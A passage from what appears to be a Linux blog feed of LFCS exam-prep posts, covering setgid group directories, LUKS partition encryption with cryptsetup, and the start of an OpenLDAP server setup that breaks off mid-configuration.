</pre></td><td class='code'><pre><code class=''><span class='line'>chown nobody:saiyans /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxr-xr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Set Group ID:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod g+s /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxr-sr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>There are no write permissions yet, so have to assign them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod g+w /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxrwsr-x. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Removed the permissions for the other users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod o-rwx /opt/invasion_plans/
</span><span class='line'>ls -ld /opt/invasion_plans/
</span><span class='line'>drwxrws---. 2 nobody saiyans 6 Feb 13 12:57 /opt/invasion_plans/</span></code></pre></td></tr></table></div></figure>


<p>Now I added 2 users to the saiyans group:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -G saiyans kakarot 
</span><span class='line'>useradd -G saiyans vegeta
</span><span class='line'>cat /etc/group | grep saiyans
</span><span class='line'>saiyans:x:9000:kakarot,vegeta</span></code></pre></td></tr></table></div></figure>


<p>And tested it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>su - kakarot
</span><span class='line'>echo kamehameha &gt; /opt/invasion_plans/boom
</span><span class='line'>su - vegeta
</span><span class='line'>echo 'final flash' &gt; /opt/invasion_plans/bang
</span><span class='line'>[kakarot@rhel7 ~]$ cat /opt/invasion_plans/bang 
</span><span class='line'>final flash
</span><span class='line'>[vegeta@rhel7 ~]$ cat /opt/invasion_plans/boom 
</span><span class='line'>kamehameha</span></code></pre></td></tr></table></div></figure>


<p>In case users need to be restricted from deleting files they didn&rsquo;t create, you can set the sticky bit with <code>chmod +t /opt/invasion_plans</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your lucky number is 3552664958674928. \
</span><span class='line'>\ Watch for it everywhere.               /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Managing encrypted partitions]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions/"/>
    <updated>2018-02-12T12:39:28-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll go over creating LUKS-encrypted partitions with <strong>cryptsetup</strong>. LUKS (Linux Unified Key Setup) is a block device encryption format that is the standard on Linux systems. Also, because it stores all the necessary data in the partition header, it&rsquo;s easy to migrate partitions.</p>

<!-- more -->


<p>To get an overview of all the cryptographic ciphers that the system can use, look in <code>/proc/crypto</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat /proc/crypto | grep name
</span><span class='line'>name         : crc32
</span><span class='line'>name         : __ghash
</span><span class='line'>name         : ghash
</span><span class='line'>name         : __ghash
</span><span class='line'>name         : xts(aes)
</span><span class='line'>name         : lrw(aes)
</span><span class='line'>name         : __xts-aes-aesni
</span><span class='line'>name         : __lrw-aes-aesni
</span><span class='line'>name         : pcbc(aes)
</span><span class='line'>name         : rfc4106(gcm(aes))
</span><span class='line'>name         : __gcm-aes-aesni
</span><span class='line'>name         : ctr(aes)
</span><span class='line'>name         : __ctr-aes-aesni
</span><span class='line'>name         : cbc(aes)
</span><span class='line'>name         : __ecb-aes-aesni
</span><span class='line'>name         : ecb(aes)
</span><span class='line'>name         : __cbc-aes-aesni
</span><span class='line'>name         : __ecb-aes-aesni
</span><span class='line'>name         : __aes-aesni
</span><span class='line'>name         : aes
</span><span class='line'>name         : crct10dif
</span><span class='line'>name         : crct10dif
</span><span class='line'>name         : crc32c
</span><span class='line'>name         : hmac(sha256)
</span><span class='line'>name         : hmac(sha1)
</span><span class='line'>name         : lzo
</span><span class='line'>name         : crc32c
</span><span class='line'>name         : aes
</span><span class='line'>name         : sha224
</span><span class='line'>name         : sha256
</span><span class='line'>name         : sha1
</span><span class='line'>name         : md5
</span><span class='line'>name         : sha224
</span><span class='line'>name         : sha256
</span><span class='line'>name         : sha1
</span><span class='line'>name         : aes</span></code></pre></td></tr></table></div></figure>


<p>For this demo, I will be using a 200MB partition called /dev/sdb1. The below command initializes the partition as a LUKS device and you have to configure a passphrase at this step.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksFormat /dev/sdb1
</span><span class='line'>
</span><span class='line'>WARNING!
</span><span class='line'>========
</span><span class='line'>This will overwrite data on /dev/sdb1 irrevocably.
</span><span class='line'>
</span><span class='line'>Are you sure? (Type uppercase yes): YES
</span><span class='line'>Enter passphrase: 
</span><span class='line'>Verify passphrase: </span></code></pre></td></tr></table></div></figure>


<p>You can check out the header:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksDump /dev/sdb1
</span><span class='line'>LUKS header information for /dev/sdb1
</span><span class='line'>
</span><span class='line'>Version:           1
</span><span class='line'>Cipher name:       aes
</span><span class='line'>Cipher mode:       xts-plain64
</span><span class='line'>Hash spec:         sha256
</span><span class='line'>Payload offset:    4096
</span><span class='line'>MK bits:           256
</span><span class='line'>MK digest:         6b 5e c2 bb 77 f9 0a 0d d4 67 4d 6f 01 a1 df 33 ce d7 94 b2 
</span><span class='line'>MK salt:           42 9d d7 5f 3b 6c c1 0b 55 53 d1 fd 28 bd 73 27 
</span><span class='line'>                   64 63 bb 70 02 de 33 46 0c 4f 2e 07 a9 a7 28 52 
</span><span class='line'>MK iterations:     68500
</span><span class='line'>UUID:              85b6a404-b24e-4c31-baf3-75cb3f041054
</span><span class='line'>
</span><span class='line'>Key Slot 0: ENABLED
</span><span class='line'>    Iterations:             547007
</span><span class='line'>    Salt:                   4d 13 8b 20 74 cb 88 dd 8e dc b3 b0 2c ca 83 4b 
</span><span class='line'>                              bd ab 12 2d 95 57 72 06 00 25 11 0e 43 b8 dc 81 
</span><span class='line'>    Key material offset:    8
</span><span class='line'>    AF stripes:                4000
</span><span class='line'>Key Slot 1: DISABLED
</span><span class='line'>Key Slot 2: DISABLED
</span><span class='line'>Key Slot 3: DISABLED
</span><span class='line'>Key Slot 4: DISABLED
</span><span class='line'>Key Slot 5: DISABLED
</span><span class='line'>Key Slot 6: DISABLED
</span><span class='line'>Key Slot 7: DISABLED</span></code></pre></td></tr></table></div></figure>


<p>Next, create a mapping between the opened LUKS partition and the device mapper.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksOpen /dev/sdb1 hidden
</span><span class='line'>Enter passphrase for /dev/sdb1: 
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>View the mapping details:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /dev/mapper/hidden 
</span><span class='line'>lrwxrwxrwx. 1 root root 7 Feb  9 18:29 /dev/mapper/hidden -&gt; ../dm-2</span></code></pre></td></tr></table></div></figure>


<p>If you want to have more insight into the status of the mapping:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v status hidden
</span><span class='line'>/dev/mapper/hidden is active.
</span><span class='line'>  type:    LUKS1
</span><span class='line'>  cipher:  aes-xts-plain64
</span><span class='line'>  keysize: 256 bits
</span><span class='line'>  device:  /dev/sdb1
</span><span class='line'>  offset:  4096 sectors
</span><span class='line'>  size:    405504 sectors
</span><span class='line'>  mode:    read/write
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>Format the partition with the filesystem of your choice:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs -t ext4 /dev/mapper/hidden
</span><span class='line'>mke2fs 1.42.9 (28-Dec-2013)
</span><span class='line'>Filesystem label=
</span><span class='line'>OS type: Linux
</span><span class='line'>Block size=1024 (log=0)
</span><span class='line'>Fragment size=1024 (log=0)
</span><span class='line'>Stride=0 blocks, Stripe width=0 blocks
</span><span class='line'>50800 inodes, 202752 blocks
</span><span class='line'>10137 blocks (5.00%) reserved for the super user
</span><span class='line'>First data block=1
</span><span class='line'>Maximum filesystem blocks=33816576
</span><span class='line'>25 block groups
</span><span class='line'>8192 blocks per group, 8192 fragments per group
</span><span class='line'>2032 inodes per group
</span><span class='line'>Superblock backups stored on blocks: 
</span><span class='line'>    8193, 24577, 40961, 57345, 73729
</span><span class='line'>
</span><span class='line'>Allocating group tables: done                            
</span><span class='line'>Writing inode tables: done                            
</span><span class='line'>Creating journal (4096 blocks): done
</span><span class='line'>Writing superblocks and filesystem accounting information: done </span></code></pre></td></tr></table></div></figure>


<p>I made a folder for mounting the new encrypted partition and mounted it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -v /dev/mapper/hidden /mnt/hidden
</span><span class='line'>mount: /mnt/hidden does not contain SELinux labels.
</span><span class='line'>       You just mounted an file system that supports labels which does not
</span><span class='line'>       contain labels, onto an SELinux box. It is likely that confined
</span><span class='line'>       applications will generate AVC messages and not be allowed access to
</span><span class='line'>       this file system.  For more details see restorecon(8) and mount(8).
</span><span class='line'>mount: /dev/mapper/hidden mounted on /mnt/hidden.</span></code></pre></td></tr></table></div></figure>


<p>When done working on it, you can unmount it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount -v /mnt/hidden
</span><span class='line'>umount: /mnt/hidden (/dev/mapper/hidden) unmounted</span></code></pre></td></tr></table></div></figure>


<p>And then remove the mapping:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksClose hidden
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>To remount it, just go through the above steps again. If you want to mount it at boot, you need to take note of some UUIDS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk -o name,uuid,mountpoint
</span><span class='line'>NAME          UUID                                   MOUNTPOINT
</span><span class='line'>sda                                                  
</span><span class='line'>sda1        b8e2fb99-bf4c-4632-883b-8ed5c2350b1e   /boot
</span><span class='line'>sda2        PLxZXl-aHBf-9VPQ-XOd1-eLMH-cWOW-NhjdcP 
</span><span class='line'>  rhel-root 2c0268ac-c31a-462d-b5b9-41bdfbecd75d   /
</span><span class='line'>  rhel-swap 6544d880-b634-4566-a68d-d3a58cec4cf6   [SWAP]
</span><span class='line'>sdb                                                  
</span><span class='line'>sdb1        85b6a404-b24e-4c31-baf3-75cb3f041054   
</span><span class='line'>  hidden    ab98b274-9d34-41f0-9178-4f8c4b7e8a77   
</span><span class='line'>sr0                                                  </span></code></pre></td></tr></table></div></figure>


<p>Then you need to edit <code>/etc/crypttab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name device &lt;password&gt; &lt;options&gt;</span></code></pre></td></tr></table></div></figure>


<p>Device refers to the block device or its UUID. The entries between tags are optional. In my case, the entry would look like this (the UUID is of /dev/sdb1)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054</span></code></pre></td></tr></table></div></figure>


<p>And edit /etc/fstab like you would for any other partition (UUID refers to the hidden mapping):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>UUID=ab98b274-9d34-41f0-9178-4f8c4b7e8a77 /mnt/hidden ext4 defaults 0 0</span></code></pre></td></tr></table></div></figure>


<p>Now you will be prompted at boot for the password. If you want to use a key for automatic unlocking, create a key file (here a random key of 4096 bytes length):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/urandom of=/root/key bs=1024 count=4 
</span><span class='line'>4+0 records in
</span><span class='line'>4+0 records out
</span><span class='line'>4096 bytes (4.1 kB) copied, 0.00100253 s, 4.1 MB/s</span></code></pre></td></tr></table></div></figure>


<p>Make it only readable by root with <code>chmod 400 /root/key</code></p>

<p>Add the key for the encrypted volume:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v luksAddKey /dev/sdb1 /root/key
</span><span class='line'>Enter any existing passphrase: 
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Key slot 0 unlocked.
</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>


<p>And add the path of the key file to /etc/crypttab</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054 /root/key</span></code></pre></td></tr></table></div></figure>


<p>Now the volume will be unlocked automatically without the need of entering a passphrase.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ You definitely intend to start living \
</span><span class='line'>\ sometime soon.                        /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - LDAP server and client configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/11/lfcs-prep-ldap-server-and-client-configuration/"/>
    <updated>2018-02-11T10:37:49-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/11/lfcs-prep-ldap-server-and-client-configuration</id>
    <content type="html"><![CDATA[<p>Something that you may come up with in the exam and that I&rsquo;ve been avoiding is the LDAP topic. In this post we&rsquo;ll look at server and client configuration for LDAP.</p>

<p>For this scenario, the hostname of my LDAP server is centos.example.com. The domain is example.com and the entry is inside /etc/hosts</p>

<p>I used <a href="https://www.certdepot.net/rhel7-configure-ldap-directory-service-user-connection/">CertDepot</a> as inspiration..the LDAP syntax and topic really keeps me away from approaching it.</p>

<!-- more -->


<h2>Server configuration</h2>

<p>To get started, install these packages:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y openldap openldap-clients openldap-servers migrationtools</span></code></pre></td></tr></table></div></figure>


<p>Some info about them:</p>

<ul>
<li><p>openldap is the open source implementation of LDAP</p></li>
<li><p>openldap-clients contains LDAP client utilities</p></li>
<li><p>openldap-servers is the server package</p></li>
<li><p>The MigrationTools are a set of Perl scripts for migrating users, groups, aliases, hosts, netgroups, networks, protocols, RPCs, and services from existing nameservices (flat files, NIS, and NetInfo) to LDAP.</p></li>
</ul>


<p>Create LDAP password from a key, (the string secret below):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>slappasswd -s secret -n &gt; /etc/openldap/passwd</span></code></pre></td></tr></table></div></figure>


<p>Inside the file take note of the generated password: <code>{SSHA}T4srVIBK+rJ9DXlVG7dvZnnAQhAZuO07</code></p>

<p>Generate an X509 certificate valid for 1 year (note the paths of the certificate and private key):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>openssl req -new -x509 -nodes -out /etc/openldap/certs/cert.pem -keyout /etc/openldap/certs/key.pem -days 365</span></code></pre></td></tr></table></div></figure>


<p>At the prompt, you can leave as blank the values except the below, where you put your server&rsquo;s hostname:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Common Name (eg, your name or your server's hostname) []:centos.example.com</span></code></pre></td></tr></table></div></figure>


<p>Change the ownership of the files inside <code>/etc/openldap/certs</code> and change the permissions of the private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /etc/openldap/certs
</span><span class='line'>chown ldap:ldap *
</span><span class='line'>chmod 600 key.pem 
</span><span class='line'>ll
</span><span class='line'>total 88
</span><span class='line'>-rw-r--r--. 1 ldap ldap 65536 Feb 11 14:08 cert8.db
</span><span class='line'>-rw-r--r--. 1 ldap ldap  1298 Feb 11 14:27 cert.pem
</span><span class='line'>-rw-r--r--. 1 ldap ldap 16384 Feb 11 14:08 key3.db
</span><span class='line'>-rw-------. 1 ldap ldap  1704 Feb 11 14:27 key.pem
</span><span class='line'>-r--r-----. 1 ldap ldap    45 Apr 26  2016 password
</span><span class='line'>-rw-r--r--. 1 ldap ldap 16384 Apr 26  2016 secmod.db</span></code></pre></td></tr></table></div></figure>


<p>Copy the LDAP database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</span></code></pre></td></tr></table></div></figure>


<p>Check the slapd configuration (below errors are safe):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>slaptest
</span><span class='line'>5a8038c4 hdb_db_open: database "dc=my-domain,dc=com": db_open(/var/lib/ldap/id2entry.bdb) failed: No such file or directory (2).
</span><span class='line'>5a8038c4 backend_startup_one (type=hdb, suffix="dc=my-domain,dc=com"): bi_db_open failed! (2)
</span><span class='line'>slap_startup failed (test would succeed using the -u switch)</span></code></pre></td></tr></table></div></figure>


<p>Change the ownership of the DB to ldap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown ldap:ldap /var/lib/ldap/*</span></code></pre></td></tr></table></div></figure>


<p>Now start the service</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start slapd</span></code></pre></td></tr></table></div></figure>


<p>Check that the LDAP service is listening:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lpt | grep ldap
</span><span class='line'>tcp        0      0 0.0.0.0:ldap            0.0.0.0:*               LISTEN      5558/slapd          
</span><span class='line'>tcp6       0      0 [::]:ldap               [::]:*                  LISTEN      5558/slapd    </span></code></pre></td></tr></table></div></figure>


<p>Next you have to add some LDAP schemas</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /etc/openldap/schema</span></code></pre></td></tr></table></div></figure>


<p>Mainly, add the following:</p>

<ul>
<li>cosine (Cosine and Internet X.500)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -Y EXTERNAL -H ldapi:/// -D "cn=config" -f cosine.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
</span><span class='line'>adding new entry "cn=cosine,cn=schema,cn=config"</span></code></pre></td></tr></table></div></figure>


<ul>
<li>nis (Network Information Services)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapadd -Y EXTERNAL -H ldapi:/// -D "cn=config" -f nis.ldif
</span><span class='line'>SASL/EXTERNAL authentication started
</span><span class='line'>SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
</span><span class='line'>SASL SSF: 0
</span><span class='line'>adding new entry "cn=nis,cn=schema,cn=config"</span></code></pre></td></tr></table></div></figure>


<p>Create the <code>/etc/openldap/changes.ldif</code> file with the below content and remember the password value from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcSuffix
</span><span class='line'>olcSuffix: dc=example,dc=com
</span><span class='line'>
</span><span class='line'>dn: olcDatabase={2}hdb,cn=config
</span><span class='line'>changetype: modify
</span><span class='line'>replace: olcRootDN
</span><span class='line'>olcRootDN: cn=Manager,dc=example,dc=com
</span><span class='line'>
